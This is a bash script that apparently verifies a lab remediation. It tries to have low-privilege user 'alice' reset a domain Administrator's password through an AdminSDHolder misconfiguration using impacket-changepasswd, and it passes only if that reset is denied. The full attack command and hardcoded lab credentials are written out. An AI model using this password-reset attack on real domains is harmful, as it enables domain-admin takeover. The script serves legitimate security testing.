#!/usr/bin/env bash
# meta4/ad-vm/scenario-20/verify-poc.sh
# PASS (exit 0) iff alice cannot reset CORP\Administrator's password.
#
# THE PREVIOUS VERSION NEVER INVOKED THE TOOL SUCCESSFULLY.
#
# It passed `-target-ip` plus TWO positionals. changepasswd.py accepts one
# positional and has no -target-ip, so argparse rejected every run on the
# 2026-07-26 gate run:
#
#   changepasswd.py: error: unrecognized arguments: -target-ip
#                    corp.local/alice:Password1!@corp-dc01.corp.local Administrator
#
# The usage message matched neither the success nor the denial pattern, so the
# check fell through to "unrecognised result -- treating as FAIL" (exit 1,
# "still vulnerable"). Gate 1 therefore passed on a usage error with no attack
# performed, and gate 2 failed against a fix that was never exercised.
#
# Correct form, from `impacket-changepasswd -h` on the attacker image:
#   positional target : [[domain/]username[:password]@]<hostname or address>
#                       -- the account whose password is being changed
#   -altuser/-altpass : the credentials used to perform the change
#   -dc-ip            : the DC address
#   -reset            : SAMR reset (uses the caller's rights) rather than a
#                       password CHANGE, which would need the old password
#
# So the attack is: alice RESETS Administrator using her own credentials, which
# succeeds only if AdminSDHolder/SDProp granted her control over the protected
# account. Usage errors are now exit 2 rather than a security verdict.

set -uo pipefail

TARGET='Administrator'
NEW='H0ldmyPwn123!'
DC=10.20.30.5
DCHOST=corp-dc01.corp.local

run_changepasswd() {
    # $1 = account to change, $2 = new password, $3 = altuser, $4 = altpass
    timeout 60 /usr/bin/impacket-changepasswd \
        "corp.local/$1@${DCHOST}" \
        -newpass "$2" \
        -reset \
        -altuser "$3" -altpass "$4" \
        -dc-ip "$DC" 2>&1
}

OUT=$(run_changepasswd "$TARGET" "$NEW" 'alice' 'Password1!')
RC=$?

echo "--- changepasswd output (rc=$RC) ---"
echo "$OUT"
echo "--- /changepasswd ---"

# --- the tool did not run: HARNESS ERROR, never a verdict ---
if echo "$OUT" | grep -qiE '^usage:|error: (ambiguous option|unrecognized arguments|argument|the following arguments)|Traceback \(most recent'; then
    echo "[verify-poc-20] HARNESS ERROR: changepasswd was invoked incorrectly" >&2
    exit 2
fi
if [ "$RC" -eq 124 ]; then
    echo "[verify-poc-20] HARNESS ERROR: changepasswd timed out after 60s" >&2
    exit 2
fi
if echo "$OUT" | grep -qiE 'Connection refused|Network is unreachable|No route to host|NT_STATUS_IO_TIMEOUT|Errno 11[013]|Name or service not known'; then
    echo "[verify-poc-20] HARNESS ERROR: cannot reach $DCHOST" >&2
    exit 2
fi

# --- reset succeeded: the AdminSDHolder backdoor is open ---
if echo "$OUT" | grep -qiE 'password was changed successfully|password was reset successfully|password changed|password reset'; then
    # Roll back with the new credential so the lab stays idempotent for the
    # next inject/reset cycle. Best effort: a failed rollback must not change
    # the verdict, but it is reported so a stuck lab is visible.
    if ! run_changepasswd "$TARGET" 'Password1!' "$TARGET" "$NEW" >/dev/null 2>&1; then
        echo "[verify-poc-20] WARNING: rollback of $TARGET's password failed" >&2
        echo "[verify-poc-20] the lab may need a baseline restore before the next run" >&2
    fi
    echo "[verify-poc-20] alice reset Domain Admin password -- AdminSDHolder backdoor open" >&2
    exit 1
fi

# --- denied: SDProp is protecting the account ---
if echo "$OUT" | grep -qiE 'access_denied|status_access_denied|insufficient.*right|ERROR_ACCESS_DENIED|STATUS_PRIVILEGE_NOT_HELD'; then
    echo "[verify-poc-20] alice's pwd-reset denied -- PoC BLOCKED"
    exit 0
fi

echo "[verify-poc-20] unrecognised result -- treating as FAIL" >&2
echo "[verify-poc-20] an unreadable transcript is not evidence of remediation" >&2
exit 1
